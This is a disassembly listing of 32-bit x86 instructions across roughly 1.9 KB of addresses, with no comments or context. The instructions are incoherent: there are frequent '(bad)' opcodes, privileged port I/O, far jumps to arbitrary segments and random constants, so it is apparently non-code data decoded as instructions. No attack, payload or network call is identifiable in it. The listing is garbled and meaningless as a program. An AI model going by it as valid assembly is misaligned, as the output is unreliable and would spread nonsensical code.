  69f60f:	sub    al,0x3c
  69f611:	call   0xfdcc03dd
  69f616:	xchg   BYTE PTR [edi+0x2a],bl
  69f619:	sub    dl,BYTE PTR [esi+esi*4-0x3f]
  69f61d:	xchg   ebx,eax
  69f61e:	xor    al,0xf1
  69f620:	mov    bl,0xf9
  69f622:	mov    esp,0xef751ed9
  69f627:	rol    DWORD PTR [edi+0x1e64d34c],0xe3
  69f62e:	shr    DWORD PTR fs:[ebp+0x51],cl
  69f632:	(bad)  
  69f633:	mov    ecx,0xb65a2a1c
  69f638:	sar    BYTE PTR [edi],cl
  69f63a:	and    DWORD PTR [ecx-0xf],0xffffff85
  69f63e:	jp     0x69f64c
  69f640:	push   ss
  69f641:	popf   
  69f642:	dec    edx
  69f643:	hlt    
  69f644:	sub    DWORD PTR [eax*2-0x70428f3d],eax
  69f64b:	clc    
  69f64c:	or     BYTE PTR [edx-0x35],ch
  69f64f:	fwait
  69f650:	push   ss
  69f651:	lock push es
  69f653:	sbb    ah,BYTE PTR [eax-0x42]
  69f656:	outs   dx,BYTE PTR ds:[esi]
  69f657:	pop    ebx
  69f658:	rcr    DWORD PTR [ebx*4+0x25484021],1
  69f65f:	xchg   ebp,eax
  69f660:	xor    eax,0xb05e46f6
  69f665:	mov    al,0xf8
  69f667:	dec    eax
  69f668:	mov    bh,0xac
  69f66a:	xor    ah,cl
  69f66c:	add    DWORD PTR [ebx+ecx*4],esi
  69f66f:	sahf   
  69f670:	popf   
  69f671:	adc    ebx,DWORD PTR [edx+0x37]
  69f674:	stc    
  69f675:	call   0xbdaf:0xfffc2d0f
  69f67c:	inc    esp
  69f67d:	bound  edx,QWORD PTR [edi]
  69f67f:	push   edi
  69f680:	out    dx,al
  69f681:	imul   edx,esp,0xffffff84
  69f684:	mov    edx,0xff97aea7
  69f689:	pusha  
  69f68a:	scas   eax,DWORD PTR es:[edi]
  69f68b:	xor    bl,BYTE PTR [edi]
  69f68d:	cmp    BYTE PTR [esi-0x7c6f50dd],dl
  69f693:	xchg   edi,eax
  69f694:	push   ecx
  69f695:	dec    esp
  69f696:	mov    ch,0xbd
  69f698:	add    al,0xdb
  69f69a:	mov    WORD PTR [ebx+0x9],?
  69f69d:	jno    0x69f63a
  69f69f:	dec    ecx
  69f6a0:	test   edi,edi
  69f6a2:	dec    esp
  69f6a3:	inc    ebx
  69f6a4:	(bad)  
  69f6a5:	inc    ebp
  69f6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69f6a7:	xchg   esp,eax
  69f6a8:	sbb    dh,bl
  69f6aa:	push   ebp
  69f6ab:	mov    ecx,0xcd7285fc
  69f6b0:	or     BYTE PTR [edx+eax*4-0x12b89e7],0xd1
  69f6b8:	jecxz  0x69f6e2
  69f6ba:	ds cdq 
  69f6bc:	ds (bad) 
  69f6bf:	add    BYTE PTR ds:0xc7412664,bh
  69f6c5:	shl    BYTE PTR [edi+ebx*2-0x4c],cl
  69f6c9:	iret   
  69f6ca:	sbb    eax,0x257c2f36
  69f6cf:	in     al,dx
  69f6d0:	mov    ecx,0x1e75d252
  69f6d5:	push   es
  69f6d6:	mov    esp,es
  69f6d8:	xor    DWORD PTR ds:0xbc06c362,edx
  69f6de:	mov    al,ds:0xc1907596
  69f6e3:	std    
  69f6e4:	adc    edx,ebp
  69f6e6:	sahf   
  69f6e7:	and    eax,DWORD PTR [ecx+0x6f9f419a]
  69f6ed:	loopne 0x69f6bb
  69f6ef:	scas   al,BYTE PTR es:[edi]
  69f6f0:	stc    
  69f6f1:	mul    BYTE PTR [edi+0x1c913f71]
  69f6f7:	int3   
  69f6f8:	mov    dh,0x4b
  69f6fa:	sbb    bl,BYTE PTR [ecx+0x6b]
  69f6fd:	jge    0x69f71d
  69f6ff:	push   edx
  69f700:	sbb    BYTE PTR [edi+0x2abcc0e2],cl
  69f706:	jg     0x69f762
  69f708:	cwde   
  69f709:	mov    edi,DWORD PTR [ebp+ebp*4-0x6f3de1a]
  69f710:	mov    al,ds:0xc41e00b4
  69f715:	jmp    0x6357:0xd71414d4
  69f71c:	aad    0xf6
  69f71e:	mov    dh,0x1
  69f720:	push   0x409e8974
  69f725:	lods   al,BYTE PTR ds:[esi]
  69f726:	add    edi,DWORD PTR [ebx]
  69f728:	add    DWORD PTR [esi],ebx
  69f72a:	cmp    dh,BYTE PTR [esi]
  69f72c:	xchg   BYTE PTR [edi+0x4ee2ed13],bh
  69f732:	in     eax,0xd6
  69f734:	xchg   ecx,eax
  69f735:	xor    eax,DWORD PTR [edi+0x7c]
  69f738:	addr16 std 
  69f73a:	mov    al,ds:0xdb454cfb
  69f73f:	and    DWORD PTR [edx],0xac574f6e
  69f745:	push   cs
  69f746:	mov    ss,ebp
  69f748:	lds    ecx,FWORD PTR [edx+0x33]
  69f74b:	repz pop ss
  69f74d:	pop    ecx
  69f74e:	mov    ds:0x89ca1a43,eax
  69f753:	xchg   esi,eax
  69f754:	mov    ds:0xd887efdb,eax
  69f759:	mov    ds:0x866680bb,eax
  69f75e:	adc    eax,0x659fe825
  69f763:	add    al,0x48
  69f765:	pop    ebx
  69f766:	or     BYTE PTR [ecx-0x3d04dbb],0x92
  69f76d:	iret   
  69f76e:	pop    esp
  69f76f:	enter  0xf141,0xa9
  69f773:	inc    esi
  69f774:	call   0x221a2e87
  69f779:	sahf   
  69f77a:	add    BYTE PTR [esi-0x541d1a0c],ah
  69f780:	std    
  69f781:	pop    edi
  69f782:	mov    eax,ds:0xcadbb2c2
  69f787:	add    eax,0xa5a59e41
  69f78c:	sbb    dl,BYTE PTR [edx]
  69f78e:	xor    al,0x2d
  69f790:	out    0x70,al
  69f792:	xchg   ebx,eax
  69f793:	mov    ebp,0x8ced2210
  69f798:	call   0x19aa5ca7
  69f79d:	xchg   ecx,eax
  69f79e:	sub    BYTE PTR [ebx-0x15e8cfa9],0x99
  69f7a5:	(bad)  
  69f7a7:	daa    
  69f7a8:	das    
  69f7a9:	cmp    bl,al
  69f7ab:	fisttp DWORD PTR [ebx+0x4be374b7]
  69f7b1:	inc    esi
  69f7b2:	pop    esp
  69f7b3:	inc    edx
  69f7b4:	mov    eax,ds:0x1f5e51b3
  69f7b9:	out    dx,eax
  69f7ba:	lock jmp 0xd9c49ced
  69f7c0:	xchg   ebp,eax
  69f7c1:	fcmovnu st,st(4)
  69f7c3:	mov    bh,0x28
  69f7c5:	fwait
  69f7c6:	add    edi,DWORD PTR [ebx]
  69f7c8:	loopne 0x69f7a2
  69f7ca:	cmp    BYTE PTR [edi],dl
  69f7cc:	das    
  69f7cd:	nop
  69f7ce:	iret   
  69f7cf:	test   BYTE PTR [edx+ebp*8-0x2a],0xef
  69f7d4:	push   0xcbdadd5d
  69f7d9:	daa    
  69f7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69f7db:	pop    ds
  69f7dc:	sub    DWORD PTR [ebx-0x1b],0x13
  69f7e0:	jge    0x69f773
  69f7e2:	pusha  
  69f7e3:	js     0x69f841
  69f7e5:	adc    al,0xe8
  69f7e7:	push   0x9ec966e1
  69f7ec:	out    0x1d,al
  69f7ee:	push   esp
  69f7ef:	mov    ch,0xe2
  69f7f1:	mov    ah,0xbf
  69f7f3:	fadd   QWORD PTR [edx]
  69f7f5:	mov    eax,ds:0x2904a646
  69f7fa:	mov    BYTE PTR [ecx+0x71],dh
  69f7fd:	sbb    BYTE PTR [edx+edx*4+0x4ec32953],ch
  69f804:	dec    ecx
  69f805:	mov    al,ds:0x2a29f4b5
  69f80a:	pop    edi
  69f80b:	inc    edi
  69f80c:	push   ebp
  69f80d:	and    eax,0xae20921b
  69f812:	ins    DWORD PTR es:[edi],dx
  69f813:	or     DWORD PTR [edi+0x1e],esi
  69f816:	or     al,0x21
  69f818:	ins    DWORD PTR es:[edi],dx
  69f819:	jae    0x69f7f0
  69f81b:	xlat   BYTE PTR ds:[ebx]
  69f81c:	aad    0x91
  69f81e:	in     al,dx
  69f81f:	pop    ecx
  69f820:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  69f822:	mov    esi,DWORD PTR [edi-0x5ee6459e]
  69f828:	add    esi,ebx
  69f82a:	cld    
  69f82b:	lods   eax,DWORD PTR ds:[esi]
  69f82c:	loope  0x69f7bc
  69f82e:	dec    ecx
  69f82f:	mov    edx,0xdd7e6740
  69f834:	in     eax,0x6f
  69f836:	and    eax,ebp
  69f838:	mov    ebx,0xda0da564
  69f83d:	icebp  
  69f83e:	clc    
  69f83f:	out    dx,al
  69f840:	push   edi
  69f841:	es inc edi
  69f843:	push   ebp
  69f844:	mov    ds:0xb7aea60c,eax
  69f849:	aad    0x44
  69f84b:	add    esp,DWORD PTR [ecx]
  69f84d:	loop   0x69f83b
  69f84f:	jp     0x69f8ae
  69f851:	cs pop ss
  69f853:	and    edi,DWORD PTR [eax+eiz*2]
  69f856:	lds    eax,FWORD PTR [ecx+0x15ab1c9d]
  69f85c:	js     0x69f81c
  69f85e:	cs jo  0x69f888
  69f861:	in     eax,dx
  69f862:	scas   al,BYTE PTR es:[edi]
  69f863:	mov    dh,0xff
  69f865:	cmp    edx,DWORD PTR [eax-0x1eb67d1]
  69f86b:	and    ecx,ecx
  69f86d:	push   edi
  69f86e:	dec    ebp
  69f86f:	or     al,0xd2
  69f871:	xchg   ebp,eax
  69f872:	(bad)  
  69f873:	cmp    BYTE PTR [eax+0x21c0c144],dl
  69f879:	jbe    0x69f893
  69f87b:	sub    ch,BYTE PTR [edi+0x11]
  69f87e:	fidiv  WORD PTR [edi]
  69f880:	xor    BYTE PTR [esi],al
  69f882:	mov    ds:0x7bdfa4d8,eax
  69f887:	fimul  DWORD PTR [edi]
  69f889:	xchg   BYTE PTR [edi-0x70],cl
  69f88c:	push   es
  69f88d:	jae    0x69f8c3
  69f88f:	adc    eax,0xe411f8ce
  69f894:	pushf  
  69f895:	fst    DWORD PTR [ebx+0x68e23fb4]
  69f89b:	mov    ah,0xf4
  69f89d:	shl    DWORD PTR [ebp+0x52],0xf4
  69f8a1:	cmp    dh,cl
  69f8a3:	or     eax,0x1227c552
  69f8a8:	gs inc ebp
  69f8aa:	jae    0x69f922
  69f8ac:	mov    edi,0xc829f0b7
  69f8b1:	and    ch,bh
  69f8b3:	add    eax,DWORD PTR [ebx]
  69f8b5:	add    al,0x53
  69f8b7:	xchg   ebx,eax
  69f8b8:	lods   al,BYTE PTR ds:[esi]
  69f8b9:	jo     0x69f8b9
  69f8bb:	data16 data16 repz out dx,al
  69f8bf:	sub    DWORD PTR ds:[edi],0xfffffffa
  69f8c3:	iret   
  69f8c4:	pushf  
  69f8c5:	mov    ecx,0x7a1e5dc3
  69f8ca:	jg     0x69f86e
  69f8cc:	cmp    al,0xa8
  69f8ce:	add    eax,0x9fcc7c07
  69f8d3:	ss pop esi
  69f8d5:	int3   
  69f8d6:	call   0xc8446acb
  69f8db:	or     ah,BYTE PTR [edx-0x24]
  69f8de:	(bad)  
  69f8df:	xor    DWORD PTR [edi],esi
  69f8e1:	xor    BYTE PTR [ecx-0x2a6ea702],dh
  69f8e7:	ret    0x37e6
  69f8ea:	sahf   
  69f8eb:	push   edx
  69f8ec:	jo     0x69f8fa
  69f8ee:	int3   
  69f8ef:	mov    ch,0xf1
  69f8f1:	sbb    BYTE PTR [edi+0x4e08bbfb],dh
  69f8f7:	repnz xchg ebx,eax
  69f8f9:	cmp    ebx,edi
  69f8fb:	imul   eax,eax,0x63
  69f8fe:	xchg   edi,eax
  69f8ff:	push   edx
  69f900:	mov    ah,0x5e
  69f902:	mov    cl,0x28
  69f904:	(bad)  
  69f905:	(bad)  
  69f906:	fnsave [esi+0x5ec9d823]
  69f90c:	push   ecx
  69f90d:	mov    gs,WORD PTR [ebx+0x12]
  69f910:	sbb    al,0x80
  69f912:	mov    al,0xa
  69f914:	xor    ecx,DWORD PTR [edx+edx*8-0x3a]
  69f918:	hlt    
  69f919:	sahf   
  69f91a:	pop    esi
  69f91b:	inc    ebx
  69f91c:	cmp    eax,0x8d79cff7
  69f921:	mov    esp,0x7e3b55ee
  69f926:	neg    DWORD PTR [ebx+0x682ac2bc]
  69f92c:	aaa    
  69f92d:	lods   eax,DWORD PTR ds:[esi]
  69f92e:	ja     0x69f8d7
  69f930:	retf   0xf7b5
  69f933:	push   ds
  69f934:	cmp    eax,0xa003d890
  69f939:	sub    al,0xfc
  69f93b:	inc    ecx
  69f93c:	retf   0x8eb0
  69f93f:	xor    dh,bl
  69f941:	ror    dl,1
  69f943:	push   edx
  69f944:	in     al,dx
  69f945:	push   cs
  69f946:	in     al,0xb8
  69f948:	xchg   edx,eax
  69f949:	(bad)  
  69f94b:	dec    esi
  69f94c:	mov    dl,0x2a
  69f94e:	imul   ebx,DWORD PTR [eax],0xf
  69f951:	add    al,0xb5
  69f953:	add    ah,BYTE PTR ds:0xa19734b
  69f959:	bnd je 0x69f9c6
  69f95c:	jge    0x69f911
  69f95e:	mov    bl,0x47
  69f960:	arpl   WORD PTR [eax],dx
  69f962:	ficomp DWORD PTR [eax]
  69f964:	push   ebp
  69f965:	jmp    0xb994:0x1f566bd6
  69f96c:	nop
  69f96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69f96e:	(bad)  
  69f96f:	jl     0x69f9e8
  69f971:	lock clc 
  69f973:	pop    ebx
  69f974:	call   0xf6b2:0x3b96b474
  69f97b:	scas   al,BYTE PTR es:[edi]
  69f97c:	pop    ecx
  69f97d:	aam    0x95
  69f97f:	sbb    ecx,DWORD PTR [esi]
  69f981:	scas   eax,DWORD PTR es:[edi]
  69f982:	sub    si,WORD PTR [ebp+0x38]
  69f986:	cs adc al,0x62
  69f989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69f98a:	outs   dx,DWORD PTR ds:[esi]
  69f98b:	idiv   DWORD PTR [edi+0x4b27a3c1]
  69f991:	test   eax,0x2a54fb28
  69f996:	jno    0x69f991
  69f998:	adc    al,0x6
  69f99a:	and    eax,0xf8e40014
  69f99f:	mov    bl,0x76
  69f9a1:	add    al,0x62
  69f9a3:	hlt    
  69f9a4:	push   cs
  69f9a5:	or     al,0x82
  69f9a7:	mov    fs,ebp
  69f9a9:	push   edx
  69f9aa:	adc    al,0xb8
  69f9ac:	fs adc dh,dh
  69f9af:	or     al,0x41
  69f9b1:	mov    ds:0xb2f98029,al
  69f9b6:	data16 jl 0x69f9ce
  69f9b9:	jg     0x69f989
  69f9bb:	(bad)  
  69f9bd:	or     al,0x81
  69f9bf:	xchg   ebp,eax
  69f9c0:	xor    BYTE PTR [ecx+0x22],al
  69f9c3:	dec    ebp
  69f9c4:	test   eax,0x3d4fdfe8
  69f9c9:	mov    dl,0x8b
  69f9cb:	push   edi
  69f9cc:	sub    edx,edx
  69f9ce:	inc    esi
  69f9cf:	xor    BYTE PTR [edi-0x11],0xa3
  69f9d3:	push   ds
  69f9d4:	adc    al,0x9d
  69f9d6:	dec    edi
  69f9d7:	sub    eax,0x5d012706
  69f9dc:	retf   
  69f9dd:	xchg   ecx,eax
  69f9de:	or     ah,ah
  69f9e0:	mov    ebp,DWORD PTR [edi+0x3f]
  69f9e3:	pop    edx
  69f9e4:	sub    eax,0x2f28c1ad
  69f9e9:	pushf  
  69f9ea:	sub    al,BYTE PTR ds:0xe40caafc
  69f9f0:	pop    esi
  69f9f1:	push   esp
  69f9f2:	loopne 0x69f9f8
  69f9f4:	and    eax,0x1e5fd0b
  69f9f9:	xor    eax,0x4e307604
  69f9fe:	aad    0xbb
  69fa00:	call   0x7bae:0xeedbb6f5
  69fa07:	lahf   
  69fa08:	dec    ebx
  69fa09:	into   
  69fa0a:	std    
  69fa0b:	jmp    0x7d74642
  69fa10:	xchg   esp,esp
  69fa12:	pop    ebp
  69fa13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69fa14:	cdq    
  69fa15:	jns    0x69f9a2
  69fa17:	aaa    
  69fa18:	jnp    0x69f9ae
  69fa1a:	sub    eax,0xeb27ca6c
  69fa1f:	xchg   BYTE PTR [ebx+edi*8+0x1a263924],dh
  69fa26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69fa27:	jns    0x69fa84
  69fa29:	fadd   QWORD PTR ds:0xb88f1953
  69fa2f:	jne    0x69fa90
  69fa31:	imul   ecx,DWORD PTR [edx+0x4906a12d],0xc4aad4c
  69fa3b:	neg    BYTE PTR [ecx-0x52c67b86]
  69fa41:	in     eax,dx
  69fa42:	push   eax
  69fa43:	(bad)  
  69fa44:	and    al,0x73
  69fa46:	xchg   esp,eax
  69fa47:	sar    BYTE PTR [ecx+0x2b],cl
  69fa4a:	mov    dl,bh
  69fa4c:	and    DWORD PTR [esi-0x54],0xfffffffa
  69fa50:	and    BYTE PTR [ecx+0x6d],al
  69fa53:	jl     0x69fac3
  69fa55:	daa    
  69fa56:	mov    cl,0x57
  69fa58:	or     DWORD PTR [ebx-0x3f],0x479605de
  69fa5f:	jmp    0x3321283b
  69fa64:	and    DWORD PTR [eax-0x39b7c0fb],ebp
  69fa6a:	push   es
  69fa6b:	sub    BYTE PTR [eax-0x5f],0xf7
  69fa6f:	adc    al,0xd8
  69fa71:	mov    ah,0x34
  69fa73:	cmp    esp,DWORD PTR [esi-0x71]
  69fa76:	sti    
  69fa77:	xchg   edi,eax
  69fa78:	xor    al,0xe6
  69fa7a:	xchg   BYTE PTR [ecx+0x16ff632],dh
  69fa80:	sbb    eax,0x45aae2ee
  69fa85:	push   edx
  69fa86:	rcl    DWORD PTR cs:[ecx*8-0x1ca7264],cl
  69fa8e:	test   ecx,edx
  69fa90:	out    dx,eax
  69fa91:	cmp    DWORD PTR [esi+0x1d],esi
  69fa94:	xchg   esi,eax
  69fa95:	loopne 0x69fa76
  69fa97:	and    BYTE PTR [esi-0x786dce8f],0xa2
  69fa9e:	dec    ecx
  69fa9f:	and    ah,BYTE PTR [ebp-0x79]
  69faa2:	mov    WORD PTR [esi+0x4a35ff71],?
  69faa8:	mov    ebp,0x487b3eb5
  69faad:	ins    DWORD PTR es:[edi],dx
  69faae:	ds lahf 
  69fab0:	lea    edi,[edi+0x5f]
  69fab3:	out    dx,al
  69fab4:	sbb    edi,ecx
  69fab6:	cdq    
  69fab7:	adc    DWORD PTR [eax+0x4626d3d3],0xffffffa4
  69fabe:	or     BYTE PTR [edx+ebp*2+0x6ada000e],al
  69fac5:	out    dx,eax
  69fac6:	push   esp
  69fac7:	cmp    ecx,DWORD PTR ds:0x301357f9
  69facd:	mov    ds:0x20e198f8,al
  69fad2:	push   DWORD PTR [ebx+ecx*1-0x7253fa43]
  69fad9:	mov    esp,0xfe2d1666
  69fade:	push   cs
  69fadf:	rol    BYTE PTR [ebx+eiz*4+0x7562f42b],1
  69fae6:	adc    DWORD PTR [esi-0x52],eax
  69fae9:	sub    ch,al
  69faeb:	fistp  WORD PTR [ebp+0x16]
  69faee:	ss into 
  69faf0:	jmp    0x4302:0xf6b09f86
  69faf7:	add    ah,BYTE PTR [edx-0x7c386c7e]
  69fafd:	xchg   ecx,eax
  69fafe:	(bad)  
  69faff:	xchg   ebx,eax
  69fb00:	call   FWORD PTR [ebx-0x3da3ee4e]
  69fb06:	lock sub DWORD PTR [ebx+0x15],ebp
  69fb0a:	cli    
  69fb0b:	add    BYTE PTR [edx+ebx*1-0x4918c4e9],al
  69fb12:	fistp  WORD PTR [edi-0x10066edf]
  69fb18:	outs   dx,DWORD PTR ds:[esi]
  69fb19:	mov    ebp,DWORD PTR [edx]
  69fb1b:	lods   eax,DWORD PTR ds:[esi]
  69fb1c:	les    ebx,FWORD PTR [edx-0x47]
  69fb1f:	popa   
  69fb20:	lds    edi,FWORD PTR [eax+0x7a]
  69fb23:	repz test BYTE PTR [edx-0x7fd8273b],ch
  69fb2a:	sbb    DWORD PTR [ebp-0x6fb22655],0x28cd06cc
  69fb34:	test   dl,al
  69fb36:	xor    esi,DWORD PTR [edx-0x1aecfe1b]
  69fb3c:	mov    edi,0x8ced00d4
  69fb41:	mov    ah,0x19
  69fb43:	fdivrp st(7),st
  69fb45:	mov    edx,0x2e9b33a9
  69fb4a:	xchg   ebx,eax
  69fb4b:	sar    BYTE PTR [ebp+eiz*2-0x367bef82],cl
  69fb52:	enter  0xd078,0x94
  69fb56:	cmp    DWORD PTR [edi+0x22b304f4],edi
  69fb5c:	inc    edi
  69fb5d:	push   ebp
  69fb5e:	dec    esi
  69fb5f:	pop    esi
  69fb60:	inc    ecx
  69fb61:	out    dx,eax
  69fb62:	pop    ds
  69fb63:	adc    esi,DWORD PTR [eax]
  69fb65:	cmc    
  69fb66:	shr    DWORD PTR [eax+0x5d],cl
  69fb69:	push   edi
  69fb6a:	aad    0xf4
  69fb6c:	push   edx
  69fb6d:	test   DWORD PTR [esi+0x4a75a219],0x21c45f8e
  69fb77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69fb78:	adc    al,0x66
  69fb7a:	leave  
  69fb7b:	or     edi,DWORD PTR [eax-0x6e]
  69fb7e:	adc    al,bh
  69fb80:	out    dx,al
  69fb81:	mov    gs,ecx
  69fb83:	and    DWORD PTR [ebx],ecx
  69fb85:	clc    
  69fb86:	lods   al,BYTE PTR ds:[esi]
  69fb87:	mov    edi,0x18ee55ad
  69fb8c:	inc    eax
  69fb8d:	mov    cl,0xaf
  69fb8f:	ds cmp al,0x53
  69fb92:	stos   BYTE PTR es:[edi],al
  69fb93:	repz dec ebp
  69fb95:	out    dx,eax
  69fb96:	sbb    edi,DWORD PTR [ebx+ebx*4]
  69fb99:	add    BYTE PTR [ecx-0x361d77bc],dl
  69fb9f:	cmp    dh,bh
  69fba1:	or     DWORD PTR [edx-0x2c],ebx
  69fba4:	lods   al,BYTE PTR ds:[esi]
  69fba5:	ficomp DWORD PTR [eax-0x558e6675]
  69fbab:	add    edi,DWORD PTR [edi]
  69fbad:	mov    bh,0xc
  69fbaf:	sub    esi,ebx
  69fbb1:	popf   
  69fbb2:	jb     0x69fc06
  69fbb4:	outs   dx,BYTE PTR ds:[esi]
  69fbb5:	mov    ds,WORD PTR [ecx+edi*1-0x75]
  69fbb9:	popa   
  69fbba:	push   ebx
  69fbbb:	xchg   edi,eax
  69fbbc:	dec    DWORD PTR [edi]
  69fbbe:	das    
  69fbbf:	inc    esi
  69fbc0:	sar    ebx,1
  69fbc2:	cld    
  69fbc3:	test   eax,0x21b4b4c8
  69fbc8:	pop    edi
  69fbc9:	test   al,0x83
  69fbcb:	fisubr WORD PTR [edx+ebx*8]
  69fbce:	(bad)  
  69fbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69fbd1:	and    eax,0x62b78a8a
  69fbd6:	push   cs
  69fbd7:	bound  edx,QWORD PTR [ebx+0x56]
  69fbda:	fwait
  69fbdb:	aaa    
  69fbdc:	test   ebx,0x78e5f7e6
  69fbe2:	cdq    
  69fbe3:	xlat   BYTE PTR ds:[ebx]
  69fbe4:	leave  
  69fbe5:	xor    eax,0xc9d6bd8f
  69fbea:	std    
  69fbeb:	stc    
  69fbec:	in     eax,dx
  69fbed:	ror    ch,cl
  69fbef:	fwait
  69fbf0:	sub    eax,0x462e938f
  69fbf5:	nop
  69fbf6:	mov    ah,bh
  69fbf8:	repz lea ecx,[edi]
  69fbfb:	(bad)  
  69fbfc:	mov    ch,0xd0
  69fbfe:	jmp    0x958109ff
  69fc03:	fild   WORD PTR [edi+0x39]
  69fc06:	sbb    eax,0x43eb0d84
  69fc0b:	cmp    al,0x82
  69fc0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69fc0e:	es jmp 0x510feef3
  69fc14:	ja     0x69fc63
  69fc16:	add    DWORD PTR [eax-0x17a49f6d],edi
  69fc1c:	sub    BYTE PTR [ebx-0x23],ch
  69fc1f:	jb     0x69fc7b
  69fc21:	inc    esp
  69fc22:	test   BYTE PTR [esi-0x60b98c6],cl
  69fc28:	add    esp,DWORD PTR [esi+0x15]
  69fc2b:	shl    DWORD PTR ds:0xb6630b6b,0xca
  69fc32:	jle    0x69fc86
  69fc34:	in     eax,0xe
  69fc36:	in     al,dx
  69fc37:	push   ebx
  69fc38:	pop    edi
  69fc39:	dec    edx
  69fc3a:	cmp    BYTE PTR [edi-0xb],ch
  69fc3d:	mov    ds:0x98a81410,al
  69fc42:	mov    al,BYTE PTR [edi+ecx*8]
  69fc45:	sub    BYTE PTR [edx+ecx*2],cl
  69fc48:	nop
  69fc49:	in     eax,dx
  69fc4a:	or     DWORD PTR [eax+0x66],eax
  69fc4d:	jecxz  0x69fc4b
  69fc4f:	add    al,0xec
  69fc51:	shr    DWORD PTR [ebx],1
  69fc53:	and    al,0xd5
  69fc55:	bound  ebx,QWORD PTR [edx-0x6eeca677]
  69fc5b:	mov    ds:0xf3d603d7,al
  69fc60:	les    ebx,FWORD PTR [ebx+ebx*4-0x4e]
  69fc64:	data16 sbb al,0xf7
  69fc67:	pop    edx
  69fc68:	shl    DWORD PTR [esi-0x6b],0xc7
  69fc6c:	rcl    esi,1
  69fc6e:	sub    al,0xf5
  69fc70:	fst    DWORD PTR [edx]
  69fc72:	retf   0xbc54
  69fc75:	rol    BYTE PTR [edx],1
  69fc77:	jmp    0xe40e:0x3dcc449d
  69fc7e:	jbe    0x69fc2e
  69fc80:	jmp    0x33be0912
  69fc85:	fxch   st(3)
  69fc87:	jmp    0x69fc40
  69fc89:	cmp    al,0x4b
  69fc8b:	push   esp
  69fc8c:	(bad)  ds:0x497341a7
  69fc92:	rcr    ebp,1
  69fc94:	and    cl,BYTE PTR [ecx]
  69fc96:	push   edi
  69fc97:	stos   BYTE PTR es:[edi],al
  69fc98:	mov    dh,0xf5
  69fc9a:	lods   eax,DWORD PTR ds:[esi]
  69fc9b:	or     ch,BYTE PTR [eax+edx*4]
  69fc9e:	clc    
  69fc9f:	add    DWORD PTR [edi+0x35],esi
  69fca2:	mov    esp,0xed7bd168
  69fca7:	cdq    
  69fca8:	or     cl,BYTE PTR [ebp-0x68b00760]
  69fcae:	xor    DWORD PTR ds:0x413f1417,ecx
  69fcb4:	mov    eax,DWORD PTR ds:0x15cac27b
  69fcba:	push   ecx
  69fcbb:	jb     0x69fc4f
  69fcbd:	aad    0x40
  69fcbf:	loope  0x69fcac
  69fcc1:	repnz test al,0x8e
  69fcc4:	sbb    DWORD PTR [ebx-0x51],edi
  69fcc7:	adc    ebx,DWORD PTR [eax-0x373adb7e]
  69fccd:	adc    ebx,DWORD PTR [ebp+edx*4-0x5d]
  69fcd1:	sbb    dh,BYTE PTR [ecx]
  69fcd3:	push   esi
  69fcd4:	adc    dh,BYTE PTR [edx+0x7]
  69fcd7:	sub    cl,ch
  69fcd9:	loop   0x69fd1a
  69fcdb:	xchg   BYTE PTR [esi],bh
  69fcdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69fcde:	mov    ch,BYTE PTR [edx+0x1]
  69fce1:	adc    DWORD PTR [ebx+eiz*1-0x64],edi
  69fce5:	mov    ch,0x5c
  69fce7:	in     al,dx
  69fce8:	sub    DWORD PTR [edi-0x1],edx
  69fceb:	or     eax,0xe5045f02
  69fcf0:	jge    0x69fd26
  69fcf2:	xor    ebx,DWORD PTR [edi]
  69fcf4:	push   edi
  69fcf5:	pop    esi
  69fcf6:	mov    esp,0xc7589874
  69fcfb:	jp     0x69fce1
  69fcfd:	pushf  
  69fcfe:	js     0x69fd04
  69fd00:	and    bl,bl
  69fd02:	scas   al,BYTE PTR es:[edi]
  69fd03:	rol    DWORD PTR [eax-0x3acf899d],0x7f
  69fd0a:	push   0x709a3b98
  69fd0f:	xchg   esp,eax
  69fd10:	in     eax,0x99
  69fd12:	sahf   
  69fd13:	inc    esp
  69fd14:	add    esp,DWORD PTR [ebx+0x21]
  69fd17:	xor    dl,ch
  69fd19:	dec    edx
  69fd1a:	sbb    BYTE PTR es:[esi-0x7b],bl
  69fd1e:	pusha  
  69fd1f:	test   al,0x61
  69fd21:	push   0x19fd22f5
  69fd26:	jmp    0x242c:0x2339bda7
  69fd2d:	(bad)
  69fd30:	test   DWORD PTR [eax+eiz*4+0x11],ecx
  69fd34:	adc    BYTE PTR [ebp+0x353be1fb],cl
  69fd3a:	fst    QWORD PTR [ebx-0x80]
  69fd3d:	mov    bl,0x73
  69fd3f:	pop    ecx
  69fd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69fd41:	fstp   TBYTE PTR [eax+0x30]
  69fd44:	jo     0x69fce6
  69fd46:	push   ecx
  69fd47:	adc    dh,cl
  69fd49:	adc    DWORD PTR [ecx],esp
  69fd4b:	pop    esp
  69fd4c:	xchg   esp,eax
  69fd4d:	add    ecx,esi
  69fd4f:	popa   
  69fd50:	xor    eax,0xc12041ac
  69fd55:	and    bh,BYTE PTR [ecx-0x7]
  69fd58:	bound  eax,QWORD PTR [edx+0x4f]
  69fd5b:	xchg   BYTE PTR [eax+ecx*2+0x67cc1d76],dl
  69fd62:	jbe    0x69fd65
  69fd64:	psubw  mm1,QWORD PTR [edi]
  69fd67:	sbb    eax,0x706dd450
  69fd6c:	lahf   
  69fd6d:	sbb    bl,BYTE PTR [edx-0x6b74587f]
  69fd73:	je     0x69fd02
  69fd75:	push   ecx
  69fd76:	stos   DWORD PTR es:[edi],eax
  69fd77:	lock add BYTE PTR [esi+esi*2],ch
  69fd7b:	xchg   ebp,eax
  69fd7c:	into   
  69fd7d:	test   BYTE PTR [ebx+edx*4],dl
  69fd80:	aad    0xb5
  69fd82:	inc    BYTE PTR [edx+eax*8-0x65]
  69fd86:	or     BYTE PTR [ecx-0x1861f00a],bh
  69fd8c:	add    al,0xaa
  69fd8e:	mov    al,0xbd
  69fd90:	inc    edi
  69fd91:	xlat   BYTE PTR ds:[ebx]
